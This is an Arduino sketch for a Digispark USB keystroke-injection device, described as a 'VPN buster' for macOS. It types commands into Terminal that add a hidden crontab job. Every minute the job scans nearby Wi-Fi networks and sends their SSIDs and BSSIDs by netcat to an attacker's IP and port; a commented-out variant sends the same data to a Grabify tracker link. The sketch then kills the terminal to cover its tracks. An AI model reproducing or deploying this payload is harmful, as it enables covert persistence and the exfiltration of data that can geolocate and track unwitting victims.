/* Digispark VPN buster to send the IP address and BSSID/SSID of nearby Wi-Fi networks on a MacOS computer to a Grabify tracker every 60 seconds.
*/
#include "DigiKeyboard.h"
void setup() {}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("terminal");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("export VISUAL=nano; crontab -e");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  /* You must fill in 'ip-address' and 'port' on line 19 with your own information */
  DigiKeyboard.print("* * * * * /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d > .ssid.txt; cat .ssid.txt | netcat ip-address port  >/dev/null 2>&1");
  /* original command which sends info to a grabify link
  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | sed 1d | xargs)\" https://grabify.link/LINK"); */
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("wait && kill -9 $(ps -p $PPID -o ppid=)");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
for(;;){ /*empty*/ }}
